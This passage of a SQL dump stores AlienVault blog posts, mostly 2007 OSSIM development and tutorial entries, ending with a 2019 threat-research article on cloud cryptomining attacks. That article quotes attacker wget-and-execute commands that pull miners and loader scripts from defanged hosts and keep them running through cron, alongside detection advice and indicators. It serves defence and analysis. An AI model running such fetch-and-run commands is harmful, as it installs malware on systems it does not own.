xkIjtzOjE6IjU\n\niO3195. The tuning/solutions.After the two warnings, there are some solutions for the problems.Database rotationFirst we implement database rotation every backup_day days. By default this is set to 5, so if you are collecting a maximum of 200.000-300.000 syslog events a day, you should be fine. If that number is much more, you can increase the days, if it’s higher, decrease. That’s the quick and dirty solution.File storageA friend of mine is working on filesystem storage in the form of /date/sensor/plugin/ip.log, hooks are there for that format and it shoud be available very soon.6. The spam.I really hate spamming on a community article, please don’t read any further if you’re satisfied with what you’ve got so far and don’t have any special requirements.Compliance module: Performance, storage, reporting.The founders of ossim have created a company about a year ago, called (in order to be original) ossim. The site is  ossim.com  and there we provide a series of added value solutions and services.Since all of this compliance stuff is really a high level enterprise need we’ve spent a lot of time packaging a few custom modules just for that matter, and are continously improving them in parallel with normal ossim evolution.So the compliance modules are being provided as sort of an add-on to the open ossim distribution, since we feel that that’s a part useless for the average community user and we would like the companies that are saving many hundres of thousands of dollars by using our opensource solution to put something back into development.Professional compliance modules include:Appliance version for easy deploymentHeavily tuned database, using a combination of Heap, Merge, InnoDB, MyISAM and compressed MyISAM tables for optimal performance / storage capacity.64Bit versionMMAP compiled libpcap applications for greatly enhanced performance (Up to Gigabyte speeds with a standard dual core machine)Sets of custom flash graphs for specific compliance needsSets of custom viewers for specific compliance needsGuides for particular compliance needs. “What exactly do I have to setup in ossim to be more compliant with XXXX”Specific supportSpecific compliance rule feeds', 'tutorialossimcompliancepluginsyslogagent', '/blogs/labs-research/tutorial-2-syslog-data-mining-with-attached-md5sum-aka-store-100-of-data');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (195, 'A review of a commercial SIM', 'Dominique Karg', 'December 5, 2007 ', 'Some time ago, earlier this year, I had the opportunity to attend to a conference where one of the leading SIM vendors (according to gartner’s magic quadrant at least) talked about their product. Although my opinion will always be biased and I tend to compare all that I see on this area with OSSIM, I also believe that I’ve got a solid base to judge others.Anyway, since I know myself and making a review comparing more than five years of work with a 5 hour demo and some document browsing isn’t fair, I won’t say the name of this product.First of all I must say I went out of the event quite impressed, and somewhat jelaous. The marketing part was impressive, well worked out and really transmitted the need of a SIM/SEM/SIEM to almost everybody. Seems like governments and some questionable laws also help this industry alot, making such an aggregated security system a must for many organizations. Anyway, this jealousy changed a bit afterwards.I don’t want to extend this to the political arena though so just to the facts: What I’ve learned(And we’re putting into practice these days)Having an Appliance based solution (even if it’s in parallel with software) is a must.Having tons of easy to understand data brochures is very important too.Compliance is an very important area to focus on.Beautiful graphs are crucial.And so is ease of use.Well, basically we already knew all of that but got the confirmation. Appliances are available, documentation is growing, we’ve developed lots of commercial things for partners, pretty graphs are present in the last releases and through the installer we started to reach an “everybody can install it” status. Pro’s and Con’s of this solution.Pro’s:Extensive helpMany predefined reports/alertsPerformance, at least on powerpoint, looked greatMany devices supportedCon’s:Lack of customization optionsSeemed somewhat “limited”. I mean, I had the feeling to have seen everything it did and could do after a couple of hours.No contextual graphs / menus. Graphs are nice, but the ability to get from high level information to lower level and back, or aggregate by your criteria is even nicer. I was really surprised to see this was missing.No talk about anomaly detectors, limited inventory options, sparse policy and asset management.No extra software included.ConclusionIf you’ve got everything in place, already have bought an IDS, an IPS, some other management systems, vulnerability scanners, NMS and such, then this sort of product is great for you.If you have tons of money to spend and you quick?ly have to achieve a specific goal hint:compliance) then this seems also like an obvious decision.But if you’re starting from scratch or adapting a few systems to a SIM/SEM environment I don’t seem many reasons to favor this system to OSSIM :-). Now the only thing left is to read the How-do-I-get-into-the-gartner-quadrant-in-order-to-focus-my-marketing-on-that-fact-HOWTO.Remember, I’m biased…', 'siemcommercialopinionreview', '/blogs/labs-research/a-review-of-a-commercial-sim');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (196, 'OSSIM Mobile now available ;-)', 'Dominique Karg', 'December 1, 2007 ', 'Well, kindof at least…Since Apple’s iPhone is basically a stripped down MacosX and it has some nice toys to play with, I thought I’d give the provided python port a try and fire up the OSSIM agent. As expected everything worked like a charm and getting ossim up & running was very easy. Here is the rest of it.Next thing was the logs. By default syslog isn’t logging on the device, so you have to enable it manually. A bit of googling did the job and I quickly were able to find how to do this:Copy /etc/syslogd.conf from any macBreak /System/Library/LaunchDaemons/apple.com.syslogd with random text so it doesn’t get loadedRestart the phone (just killing syslog should work too) and run /usr/sbin/syslogd -bsd_out 1 &Voila, syslog up & running.Now the fun part. Looking at what kind of events the iphone generated I thought maybe this little toy may deserve a plugin on it’s own. So after some poking around I came up with a small list of interesting events:Dec 1 17:33:03 localhost /usr/sbin/mediaserverd: In H264 decode frame thread the first timeDec 1 17:36:19 localhost YouTube[189]: clearing out queueDec 1 17:37:26 localhost crashdump[199]: Creating crash report for process vi[192]Dec 1 17:40:25 localhost MobileSMS[219]: SummerBoardLoader: SummerBoardService available.Dec 1 17:47:32 localhost MobileCal[235]: SummerBoardLoader: SummerBoardService available.Dec 1 17:51:29 localhost SpringBoard[15]: Memory level is urgent (10), but there are no apps to warn!Dec 1 17:54:14 localhost MobileMusicPlayer[50]: initializeMainUI, Role = 2 (MediaPlayer)Dec 1 17:55:23 localhost Installer[51]: ATInstaller: Initializing…Dec 1 17:55:29 localhost Installer[51]: ATPackageManager: Refreshing source: http://conceitedsoftware.com/iphone/Dec 1 17:56:30 localhost Installer[51]: ATPackageManager: Perfoming operation “Install” on package “Tapp”...Dec 1 18:25:02 localhost Installer[58]: ATPackageManager: Queued package “Tapp” for operation “Uninstall”.Dec 1 17:56:30 localhost Installer[51]: ATUnpacker: Extracting folder: Tapp.app/ >> /Applications/Tapp.appDec 1 17:56:31 localhost Installer[51]: ATUnpacker: Extracting file: Tapp.app/TableApp >> /Applications/Tapp.app/TableAppDec 1 18:25:02 localhost Installer[58]: Executing script instruction: RemovePath with arguments (”/Applications/Tapp.app”)Dec 1 17:58:47 localhost MobileBluetooth[12]: Session::attach “com.apple.mobilephone1014721381”So, after a rainy afternoon I had my fully working iphone plugin.See it in action on the following screens:(image removed, broken link, I\'m very sorry. DK.)Could have some interesting big brother uses… and the good thing is, if the agent has no connection to the server it will queue up the events and send them the next time it can reach it.And for the end, a quick proof of concept screenshot2007-12-01 19:03:29,366 Conn [DEBUG]: event type=\"detector\" date=\"2007-12-01 17:58:34\" sensor=\"127.0.0.1\"\n\ninterface=\"any\" plugin_id=\"4006\" plugin_sid=\"4\" protocol=\"tcp\" src_ip=\"127.0.0.1\" userdata1=\"MobilePhone\"\n\nuserdata2=\"55\" log=\"Dec  1 17:58:34 localhost MobilePhone[55]: SummerBoardLoader: SummerBoardService\n\navailable.\"\n\n^C2007-12-01 19:03:31,192 Agent [WARNING]: Kill signal received, exiting..\n\n2007-12-01 19:03:31,200 Conn [INFO]: Closing server connection..\n\n2007-12-01 19:03:31,210 Stats [INFO]:\n\n-------------------------\n\n Agent execution summary:\n\n  + Startup date: Sat Dec  1 19:03:10 2007\n\n  + Shutdown date: Sat Dec  1 19:03:31 2007\n\n  + Total events: 66 (Detector: 66, Monitor: 0)\n\n    - plugin_id 4006: 66\n\n  + Apps restarted by watchdog: 0\n\n  + Server reconnection attempts: 0\n\n-------------------------\n\n2007-12-01 19:03:31,224 Stats [INFO]: Agent statistics written in /var/log/ossim/agent_stats.log\n\nzsh: killed     ./ossim-agent -v\n\n# uname -a\n\nDarwin iPhone 9.0.0d1 Darwin Kernel Version 9.0.0d1: Wed Sep 19 00:08:43 PDT 2007;\n\nroot:xnu-933.0.0.203.obj~21/RELEASE_ARM_S5L8900XRB iPhone1,1 Darwin\n\n#', 'ossimpluginsagentiphone', '/blogs/labs-research/ossim-mobile-now-available');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (197, 'MySQL performance tuning applied to OSSIM. Case 1.', 'Dominique Karg', 'November 30, 2007 ', 'I’d like to share my first actual success on mysql tuning, after having spent a couple of days reading everything I could about the matter (and still waiting for the books to arrive).From what I’ve seen a very important point on DB optimization is the right table design, followed by the right queries and finally optimizing DB parameters. Since I don’t know enough yet about optimal DB design I’ll skip that phase (tho I’ll definetively accomplish it during the next weeks/months) and examining some queries.After enabling log_slow_queries, one of the first queries popping out continuously was the following:SELECT *, inet_ntoa(src_ip) as aux_src_ip, inet_ntoa(dst_ip) as aux_dst_ip FROM event_tmp order by id desc limit 1;Ugly, ain’t it ?A little bit of explanation about the event_tmp table and how we use it may come handy to understand this.IntroductionAfter stumbling across  Digg spy  some time ago, it seemed like a nifty feature to add to ossim. A real time event viewer. So that’s what we started to do.Shortly after starting we already had performance issues, since basically we had to aggregate lots of information from many unrelated tables, and do this every second. So we wrote a cache table:And this it how it looks like:(image removed, broken link, I\'m very sorry. DK.)mysql> desc event_tmp;\n\n+-----------------+------------------+------+-----+-------------------+-------+\n\n| Field           | Type             | Null | Key | Default           | Extra |\n\n+-----------------+------------------+------+-----+-------------------+-------+\n\n| id              | bigint(20)       | NO   | PRI |                   |       |\n\n| timestamp       | timestamp        | NO   |     | CURRENT_TIMESTAMP |       |\n\n| sensor          | text             | NO   |     |                   |       |\n\n| interface       | text             | NO   |     |                   |       |\n\n| type            | int(11)          | NO   |     |                   |       |\n\n| plugin_id       | int(11)          | NO   |     |                   |       |\n\n| plugin_sid      | int(11)          | NO   |     |                   |       |\n\n| plugin_sid_name | varchar(255)     | YES  |     | NULL              |       |\n\n| protocol        | int(11)          | YES  |     | NULL              |       |\n\n| src_ip          | int(10) unsigned | YES  |     | NULL              |       |\n\n| dst_ip          | int(10) unsigned | YES  |     | NULL              |       |\n\n| src_port        | int(11)          | YES  |     | NULL              |       |\n\n| dst_port        | int(11)          | YES  |     | NULL              |       |\n\n| priority        | int(11)          | YES  |     | 1                 |       |\n\n| reliability     | int(11)          | YES  |     | 1                 |       |\n\n| asset_src       | int(11)          | YES  |     | 1                 |       |\n\n| asset_dst       | int(11)          | YES  |     | 1                 |       |\n\n| risk_a          | int(11)          | YES  |     | 1                 |       |\n\n| risk_c          | int(11)          | YES  |     | 1                 |       |\n\n| alarm           | tinyint(4)       | YES  |     | 1                 |       |\n\n| filename        | varchar(255)     | YES  |     | NULL              |       |\n\n| username        | varchar(255)     | YES  |     | NULL              |       |\n\n| password        | varchar(255)     | YES  |     | NULL              |       |\n\n| userdata1       | varchar(255)     | YES  |     | NULL              |       |\n\n| userdata2       | varchar(255)     | YES  |     | NULL              |       |\n\n| userdata3       | varchar(255)     | YES  |     | NULL              |       |\n\n| userdata4       | varchar(255)     | YES  |     | NULL              |       |\n\n| userdata5       | varchar(255)     | YES  |     | NULL              |       |\n\n| userdata6       | varchar(255)     | YES  |     | NULL              |       |\n\n| userdata7       | varchar(255)     | YES  |     | NULL              |       |\n\n| userdata8       | varchar(255)     | YES  |     | NULL              |       |\n\n| userdata9       | varchar(255)     | YES  |     | NULL              |       |\n\n+-----------------+------------------+------+-----+-------------------+-------+This table would have all the needed information so we could write a nice scrolling real time event viewer.The actual implementation is like a ring buffer, you specify how many events you want to keep in that table at max and the server will take care that the table doesn’t get too big. (10000 being the default).The codeGetting back to the previous query, it was our quick & dirty attempt at getting the last row out of that table. Let’s see what it actually does:mysql> explain SELECT *, inet_ntoa(src_ip) as aux_src_ip, inet_ntoa(dst_ip) as aux_dst_ip FROM event_tmp order by id desc limit 1;\n\n+----+-------------+-----------+-------+---------------+---------+---------+------+-------+-------+\n\n| id | select_type | table     | type  | possible_keys | key     | key_len | ref  | rows  | Extra |\n\n+----+-------------+-----------+-------+---------------+---------+---------+------+-------+-------+\n\n|  1 | SIMPLE      | event_tmp | index | NULL          | PRIMARY | 8       | NULL | 10001 |       |\n\n+----+-------------+-----------+-------+---------------+---------+---------+------+-------+-------+\n\n1 row in set (0.00 sec)Well, that’s pretty bad. Having to traverse 10000 rows in order to get one out of it ? what if our tmp table had millions ? no good.So, rethinking this, since id is autoincremental anyway, we could just fetch the highest one…mysql> explain select max(id) from event_tmp;\n\n+----+-------------+-------+------+---------------+------+---------+------+------+------------------------------+\n\n| id | select_type | table | type | possible_keys | key  | key_len | ref  | rows | Extra                        |\n\n+----+-------------+-------+------+---------------+------+---------+------+------+------------------------------+\n\n|  1 | SIMPLE      | NULL  | NULL | NULL          | NULL | NULL    | NULL | NULL | Select tables optimized away |\n\n+----+-------------+-------+------+---------------+------+---------+------+------+------------------------------+\n\n1 row in set (0.00 sec)Much better. No single row needs to be accessed since we just use the index/key column. So let’s finish up the query simulating the original one:mysql> explain select *, inet_ntoa(src_ip) as aux_src_ip, inet_ntoa(dst_ip) as aux_dst_ip  from event_tmp where id = (select max(id) from event_tmp);\n\n+----+-------------+-----------+-------+---------------+---------+---------+-------+------+------------------------------+\n\n| id | select_type | table     | type  | possible_keys | key     | key_len | ref   | rows | Extra                        |\n\n+----+-------------+-----------+-------+---------------+---------+---------+-------+------+------------------------------+\n\n|  1 | PRIMARY     | event_tmp | const | PRIMARY       | PRIMARY | 8       | const |    1 |                              |\n\n|  2 | SUBQUERY    | NULL      | NULL  | NULL          | NULL    | NULL    | NULL  | NULL | Select tables optimized away |\n\n+----+-------------+-----------+-------+---------------+---------+---------+-------+------+------------------------------+\n\n2 rows in set (0.00 sec)\n\n\n\nmysql>Fantastic, now we only need to query 1 row, regardless of how many tmp rows we might have in there. We could easily remove the limiting code from the server and just get a cleanup process chop the table every once in a while.ConclusionIf you’re an SQL expert you might not be impressed by this at all, but for me who I’m just taking my first steps deeper into all of this it’s been a nice feeling of accomplishment, and an extra motivation push for further delving into this matter.', 'ossimmysqltuning', '/blogs/labs-research/mysql-performance-tuning-applied-to-ossim-case-1');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (198, 'MySQL Performance Tuning', 'Dominique Karg', 'November 28, 2007 ', 'I’ve finally decided to learn everything I could about MySQL performance tuning; we’re working on highly tuned appliances and this is a must for high-traffic environments.I’d like to share my first findings on interesting stuff and encourage comments on the matter, which seems as deep as any science.These last days we’ve discussing about this at the office and we couldn’t agree about the type of database configuration using MySQL was optimal for the broadest range of users.It’s much easier to tune everything if you already know the exact environment, available hardware and so on, rather than trying to tune a database for a broad range of people going to install a product.Enough of introduction anyway, I want to get to the bottom of this issue once and for all, so for a beginning I ordered these three books: MySQL Administrator’s Guide Paul du Bois (Autor)MySQL High Performance Jeremy D. Zawodny (Autor), Derek J. Balling (Autor)MySQL Clustering Alex Davies (Autor), Harrison Fisk (Autor)Besides the books, which should arrive in less than a week, I’ve been googling quite a lot. I really have to try out mirroring an event table into memory from where events are being fetched and writing a copy into disk. I also see that a lot of index and key optimization can be done in all the involved databases.Anyway, it’s too early to reach a conclusion, in the meantime here’s a very interesting piece of reading about index optimizations.Other interesting options:Clustering using mysql blackholesVertical or Horizontal partitioningCaching certain tables in order to greatly improve performance (ossim_event, event, plugin_sid and some others with heavy usage)Correctly assign indexes to all the involved tables without increasing disk usage too muchAnyway, if you’ve got an opinion, suggestion or any sort of input about all of this, please share it on the comments section or send me a mail and I’ll post conclusions here.', 'ossimmysqlperformancedatabase', '/blogs/labs-research/mysql-performance-tuning');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (199, 'Plugin Tree && Graph installer update', 'Dominique Karg', 'November 26, 2007 ', 'I thought I’d post a plugin tree I just hacked together here. It uses a javascript library and could be useful to someone.\nI’m not posting the complete tree here since the page is about 1MB big.As a little extra, below is some sample output from the graph package installer. Pablo’s almost done with it :-)\nChanging working dir to /tmp/swf_plugins.kUgtCe15592\n\nLoading files… \n\nTemplate file: top_nets.inc\n\nSource file: top_nets.php\n\nExtracting files… \n\netc/ossim/framework/panel/swf_plugin_templates/top_nets.inc\n\nusr/share/ossim/www/graphs/top_nets.php\n\nChecking PHP sintaxis (with lint [ see php -l ])\n\nNo syntax errors detected in etc/ossim/framework/panel/swf_plugin_templates/top_nets.inc\n\nNo syntax errors detected in usr/share/ossim/www/graphs/top_nets.php\n\nPHP sintaxis Ok!\n\nChecking template format: etc/ossim/framework/panel/swf_plugin_templates/top_nets.inc\n\nName Ok!\n\nHomepage Ok!\n\nDescription Ok!\n\nCategory Ok!\n\nRevision Ok!\n\nParameters Ok!\n\nDetected pair of Parameters Ok!\n\nThe template format looks good.\n\n*************************\n\nChecking for older revision of Top C&A nets rev:1\n\nDetected posible older revision in /etc/ossim/framework/panel/swf_plugin_templates/top_nets.inc\n\nLocal Name: Top C&A nets\n\nThe plugin Top C&A nets is already installed. Checking Revision Number\n\n1 x 0\n\nUpgrading Top C&A nets rev:0 to rev:1\n\nChanging working directory to /\n\netc/ossim/framework/panel/swf_plugin_templates/top_nets.inc\n\nusr/share/ossim/www/graphs/top_nets.php\n\ntop_nets.tgz Installed ok!', 'ossimpluginsgraphs', '/blogs/labs-research/plugin-tree-graph-installer-update');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (200, 'Tutorial 1: Host Inventory using OSSIM', 'Dominique Karg', 'November 25, 2007 ', 'This post will be the first of a series of tutorials describing how to accompliush certain useful things using OSSIM. A friendly IT teacher from Oklahoma suggested that it would be a good idea, and I have to agree. And on top, it’s relaxing :-).So here we go, this first installment will focus on deploying OCS Inventory on a couple of hosts, getting them to log to the central ossim server and see how it shows up in our interface. This will demonstrate the powerful cross-platform inventory capabilities built into ossim thanks to the new OCS integration.The test environment consists of 6 devices:Apple 10.5 LeopardDebian 4.0 Linux inside ParallelsIPhone MacosXOpenBSD 4.xWindows XP inside ParallelsYellow Dog Linux running on a PS3Step 1: Check out how our freshly installed image is performingAfter logging into the interface we first check the specific Inventory tab at the executive panel, seeing how it is currently empty:(Image removed, broken link, I’m very sorry. DK.)Next, we go to Reports -> OCS Inventory and also see how it is (still) empty:(Image removed, broken link, I’m very sorry. DK.)Step 2: Start installing the agents. Windows.During step two we’ll install the ocs Agent on windows. The ossim installer already rewrites the ocs package with the server IP you’ve configured during installation, so actually deploying agents is very simple.First we’ll go to Tools -> Downloads in order to get the pre-configured installer package. As you may notice on this screenshot, I’ve created a very restricted user with no permissions, he just can see and fetch things from the download page.(Image removed, broken link, I’m very sorry. DK.)After downloading we open up the compressed file and execute the “install.bat” script. This should go on pretty fast and will install and enable OCS on the system.(Image removed, broken link, I’m very sorry. DK.)By default, ocs schedules itself to run on a daily basis (not 100% sure aabout this) so at first you won’t get any inventory. Anyway, since I’m more of the impatient kind I want to force it.In order to force an inventory we must execute “inventorize_now.bat” after installation. It can be done from the zip already, as shown below:(Image removed, broken link, I’m very sorry. DK.)And voila, there we’ve got our first inventoried host and it’s detail:(Image removed, broken link, I’m very sorry. DK.)Step 3: Continue installing the agents. Debian Linux.Our next step will will involve installing the OCS agent on the ossim server itself. Since we’re on the filesystem we can just copy the included agent package to some tmp directory, uncompress it, install everything and there we go.And, the resulting host will appear on our list, and it’s detail:(Image removed, broken link, I’m very sorry. DK.)Step 4: Continue installing the agents. Macox (including IPhone).Since only Windows and Linux agents are included with the installer, you have to find ocs inventory agents for other systems from the contrib page. It is linked from Downloads->Tools for easy reference.Here you can see how it looks like, we’ll be using the MacosX agent for this step and the unix agent for the next one (ain’t it pretty?):(Image removed, broken link, I’m very sorry. DK.)Now to the bad news. I tried to get it running but the current version doesn’t work on Leopard, nor does it work on the iPhone either (not even exporting the xml inventory to another host, though iPhone does run php).So, here you can see my efforts but after skimming over the forums I don’t thing I’ll waste much time on this right now. Pretty sure the author will come up with a leopard compatible version at some time. Check the post at the bottom of  this link  for more information, you might be luckier than I’ve been.Step 5: More agent installation. Openbsd.This one has been pretty straightforward. Downloaded the unix version, had curl and libxml2, pointed at the right zlib path and there we go.And the PoC:(Image removed, broken link, I’m very sorry. DK.)Step 6: Inventory of a PS3. YDL.Since the ocs agent installer provides all the needed deps, this was straightforward too and very similar to the other linux one, so no log included. The PS3 is actually quite an impressive linux platform btw :-)(Image removed, broken link, I’m very sorry. DK.)Final Step 7: ConclusionSo there we go, if everything had gone well now I’d have had every host surrounding me inventoried. Sadly there was that minor macosx glitch, but I had it running on Tiger and I assure you it works.Our final setup looks like this:(Image removed, broken link, I’m very sorry. DK.)And… do you remember the empty inventory graph section at the beginning ? well, as expected, now it’s got some data in it:(Image removed, broken link, I’m very sorry. DK.)I hope you enjoyed this first tutorial, if you like it please leave a quick comment below, since I’m just testing if all this blogging thing makes sense to me any feedback will be welcome.', 'tutorialossiminstallerocs', '/blogs/labs-research/tutorial-1-host-inventory-using-ossim');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (201, 'Installer updates.', 'Dominique Karg', 'November 24, 2007 ', 'Let’s get a first meaningful update running too.We have been working hard these last weeks to get the installer out and polish some outstanding issues. After the initial releases, our priorities are now focused on:Get an updater done (will be included with 1.0.4)Fix some remaining issues (two persons have reported hangs at specific OS installation stages)Allow for easy installation of specific graph plugins depending on scenario (ISO, Inventory, Nessus, etc…)This last point has been evolving a lot and adding new custom graphs to the panel is as easy as ever. Check the screens below (once I’ve got them uploaded :-) ). (image removed, broken link, I’m very sorry. DK.) In the meantime, we preinstalled OSSEC (thanks Daniel for your help), fixed the Nagios plugin, fixed rrd_plugin which was missing a config line and added Munin to the sensor pages for performance monitorization.', 'ossiminstallerossecgraphsmunin', '/blogs/labs-research/installer-updates');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (202, 'Making it Rain - Cryptocurrency Mining Attacks in the Cloud', 'Tom Hegel', 'March 14, 2019 ', 'By Chris Doman and Tom HegelOrganizations of all sizes have made considerable shifts to using cloud-based infrastructure for their day-to-day business operations. However, cloud security hasn\'t always kept up with cloud adoption, and that leaves security gaps that hackers are more than happy to take advantage of.One of the most widely observed objectives of attacking an organization\'s cloud infrastructure has been for cryptocurrency mining. Despite recent falls in cryptocurrency prices, mining campaigns continue to plague organizations. Below, we\'ve shared some of the more noteworthy forms of attack where the hackers’ end objective is to use your cloud infrastructure to mine cryptocurrency.Compromised Container Management PlatformsWe\'ve seen attackers using open APIs and unauthenticated management interfaces to compromise container management platforms.We recently investigated attacks involving mining malware served from the domain xaxaxa[.]eu. That domain may sound familiar, as it appeared in a February 2018 report by RedLock on the compromise of the Kubernetes infrastructure of an electric car company. The report details the container commands showing the malicious request.RedLock reported the attackers used the compromised Kubernetes server in Amazon Web Services to mine Monero and potentially access customer data. In the event of such unrestricted access, cryptocurrency mining is one of the least malicious outcomes to victim organizations. For example, customer data and business operations could be at risk for theft or malicious modification.Following the attention of the report by RedLock, the owners of xaxaxa[.]eu published a Public Notice stating that they are just a mining proxy and are not responsible for any malicious activity themselves.Notably, we have also observed the domain serving pages saying it is a Dynamic Domain and a Vesta Control Panel. However, we have seen from other attacks listed in this article that the root domain is actively involved in serving malware and implicated in other campaigns.Control Panel ExploitationWe have also observed attacks aimed at the control panels of web hosting solutions. The impact is similar to the previous topics, essentially allowing administrative control over web services for the execution of malicious code.In April 2018, the same attackers that compromised Kubernetes infrastructure started exploiting an unknown vulnerability in VestaCP.  This was followed by frantic posts on the official VestaCP forums and those of web-hosts that run VestaCP.  VestaCP users provided details on how their installations were compromised.In these attacks, they added a new backdoor user called “sysroot,” and then downloaded and installed the XMRig application to mine Monero cryptocurrency.pkill -f xmrig;wget -O /tmp/gcc http://xaxaxa[.]eu/gcc;chmod +x gcc;wget -O /tmp/config_1.json http://xaxaxa[.]eu/config_1.json;/tmp/gcc -c /tmp/config_1.json;Lastly, the attackers set the following script to run in Cron, ensuring mining persistence after quick attempts at removal.wget -O /tmp/load.sh http://bigbatman[.]loan/load.sh; chmod 777 /tmp/load.sh; /tmp/load.sh >> /tmp/out.logwget -O /tmp/load.sh http://xaxaxa[.]eu/load.sh; chmod 777 /tmp/load.sh; /tmp/load.sh >> /tmp/out.logWhile not directly related to mining, it’s noteworthy to mention VestaCP has had a number of other security issues. One of particular severity was a compromise of the official source-code which resulted in the administrative username and passwords of new installations being sent to attackers. This resulted in the malicious deployment and use of Linux/ChachaDDoS malware.API Key CompromisePerhaps the best known method of compromising cloud computing is through the theft of API keys. There are many attackers who automatically scan the web and various public tools such as GitHub for API keys which are unknowingly publicly accessible.As some have experienced, the attackers work fast and can greatly impact business operations. A post from a Reddit user claiming AWS key was compromised to mine Monero, detailing how their AWS account was hacked in January 2018 to mine Monero.Malicious Docker ImagesAnother avenue of attack is to run malicious Docker containers. This approach generally relies on individuals across the world who use prebuilt Docker images and in an effort to save time, download images with containers operating a mining service.This mining service is unknown to the user and will continue generating income for the malicious owner. There have been reports of Docker images known to be abused in Monero mining schemes on Dockerhub, the official container repository.The images originally reported on have since been removed, but we continue to encounter other malicious containers (such as those from the Luoxk mining botnet) that remain on DockerHub.There have been a relatively small number of users who have reported running these malicious containers. However, some may still be found on Reddit on compromise by Luoxk.Detecting Cryptocurrency Mining AttacksBelow, we’ve outlined some recommendations for detecting mining attacks in the cloud. The screenshots are from our USM Anywhere platform, however a similar approach should be possible in other threat detection and response tools.You can detect the Stratum mining protocol over the network.Figure 7. A network detection for crypto-mining You can also detect crypto mining generically on hosts by looking for command line parameters that resemble those of common crypto-mining tools such as xmrig.Figure 8. A host detection for crypto-miningFor server-side attacks that lead to instances compromised for mining, we normally see exploits executed over the network.Figure 9. A host detection for an exploited Tomcat instanceMost of these network exploits then run shell scripts to persist via cron jobs and run crypto-mining from the /tmp folder. You can look for both of these suspicious behaviours.Figure 10. A generic detection for crypto-mining on a hostYou can also use Yara rules to identify crypto mining software.Figure 11. A detection for mining software detected on a host  Good Yara rules to detect mining software are also available from Florian Roth and Gelos Snake.You can also generically look for Docker containers spinning up with suspicious commands containing keywords associated with crypto-mining.Figure 12. A generic detection for a crypto-mining Docker container The malicious activity is often specific to cloud environments. For example, when an attacker steals a credential for AWS, they will normally start deleting instances and spinning up new instances to mine cryptocurrency.This generates a large number of suspicious events.Figure 13. AWS IAM Role Access Failure Alarm. Figure 14. AWS EC2 Security Group Modification Alarm. Figure 15. AWS Instance Terminated Alarm. Figure 16. CloudTrail Trail Deleted Alarm Figure 17. ACL Exposing Amazon S3 Object or Bucket Added Alarm Figure 18. AWS Root Account Login Alarm.We now map these detections out by the MITRE ATT&CK™ framework, so you can quickly see the progress of an attacker.Figure 19. Detections mapped by the MITRE ATT&CK™ framework  Indicators of CompromiseYou can view additional indicators in our OTX Pulse.xaxaxa[.]funxaxaxa[.]eubigbatman[.]winbigbatman[.]loanbigbatman[.]bid wio2lo1n3[.]pw5408sb[.]com a9036cc7a118849120674a5f296753fcfb9cff833727373687233abea52f232858d74311cf258fc78bc868bd7e4aa59df4dbbf9eb814d52ac58290c9e1ce91c992f18aaa1296fe5ef494cbc29c19801b4513281ee3d1d1740fea0228667a1c1bbc3d6191665ee1fb8194f4141f9f4316fec7139412a698087ff1a3c740d8074ad5fb3dec8ccfbbf665d4f03396c5965d35ce670c001448fae829af1452ee25ee34e5e80f0ca00ed9dc7bdb96b80c5acd326d1dd4650871cf96255cb3763576a4549f8b9260afeb8c409321c43efc36307d9435f93eab87d46232e42a594af552c7c00ae277fcda556b0484bb1fb211f16196f675d966ad7bb886089f0e6bbe5898a652b8b1d9e2a7f30ad7b4493075facf0d05e5fb8478c2d8459259c29f69dd6a57b075d764095b893f95e0e6c067a719777086b17dda78bbcd0bcc1ae0bb47fe8aa471b8e66e2ff078bf185d3eef37c76c9a2acd41d601223cda56d0a93b879bf72a95caf40c2d0c9e20467bc10651a4217a1a77d80b3d109df67b5f5f9cc30d71406f8b4512e7ef1f066618b0b7fadb92acfea2786390d6c160b665551fae7c7721ba3133168df5abe8911d13416f9c49e20875d32d5ed0fba0a9107009c06c81a68daa9cf8d9c050136822352c2116a01589966fbc5860c952dd025c01da9e1d14bec32854954cdea48c90bfecb0bed6c6ce782891220a0e1de9534acfb368993d434f653b51ff9730026553740810e036910597c77186d2d584f211f930dc8dd8bece84345ea2831114fba34942e58c97208163ade2eb30b804f0f2577a12090d1a8045f21c848958a12de8ba00090ff4866096f27e5ee381631890d55c1ee8281ecafd4f9a483a647f8f8de1171e5ea4fce47521891c0515608ac24d27ab69674c0ee7e32cea99df23f5d0dd28c12570c542e89c40fc4823e732a22fc5c065c06a9f9cd2d5e188360a0c931747d79720c7fcb470279cf19b4142fa442c7270cd606364e2e6692a26fa1bd2ede1abae87a6e0fcd0d0bc3a3c8e06c88a1cd04e918b322a76d1fabae1d82452446bbbe1cc54d11aab728e7aab24f616ae357c1bfd187b5b701b0f646b1ad3e32a174e9d37974c3170aaca594847977b204b37b0b6ee5ca3166f569e73fcc6b5334dc97bdca3a0628c18fcfacdd1f7773c8ff36697d9cfc3db2dee3067b9bd7803a098bb597312c11081601835f2c03b1689bd02e16a6c8af251d7fb3a392b492a2d7953f32bce3d82304950690a1b17de4320b7ef6c5a0d6ff6f4e142c7bb3dcd0234e43ee3ffc49aa4fca944ee07725b331fb48aa189d3632ff115e2d2ab6c5d686736976fff0496a018111203c70859ab9004c9514b386f3ec08391d4bff3e7194c91ff34ab0be1404c28b9a7dce1e27956f4d2a44fbe4d9a35f5d52dfd00cee74dfb5087f3429b931b622758e6dce468b9ae4462c7a5e6c418f890b9be0aef43a2579b9c88b66bfca005c2251f974984f4a561a1c2482cfa842635c098757937f08e4de86fb6674e34c8abc2af3053989ecb17adb5dc93dc1be4543070f07d99a5814fcb59c0348e382b1a4f288d3680a54efc8d7fd7831b1c7d0a5bdd1b070f79cc24a7c85480d667821fb325c3ab936ee970eade9c8b126a55327470b1c6190dc4c0843e2af924b1391c8531ee0dee3fcb36a932ddb1738ba5c519c956d61bf41aba1f1069f93fe93fc4b8fecc4ddee98ea24a2978e9a1c254ca88ac2de98101b93b365316833eea23e5f40d214e